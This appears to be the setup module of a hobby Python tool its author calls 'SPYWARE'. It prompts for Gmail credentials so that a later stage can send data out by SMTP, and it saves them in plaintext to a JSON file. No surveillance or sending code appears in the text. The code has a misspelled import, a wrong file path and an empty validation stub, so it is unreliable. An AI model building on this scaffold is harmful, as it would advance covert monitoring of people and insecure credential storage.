import os
import json
from termcolor import colored
from pyfiget import figlet_format
import re


def create_file(email, password):
    info = {
        'email': email,
        'password': password
    }

    if not os.path.isdir('./user_info'):
        os.mkdir('user_info')
        print('[+] Created ./user_info directory')

    with open('info.json', 'a+') as output_file:
        json_dump = json.dumps(info)
        output_file.write(json_dump)

    print('[+] Created ./user_info/info.json file')


def validate_email(email):
    pass


def main():
    app_name = colored(figlet_format('SPYWARE'), color='magenta')

    print(app_name)
    print('-By dszyszek')
    print('===============================================================\n')
    print('You\'ll need gmail account to process (program uses their SMTP server)')

    email = input('Email: ')
    validate_email(email)

    passwword = input('Password: ')

    create_file(email, passwword)


if __name__ == '__main__':
    main()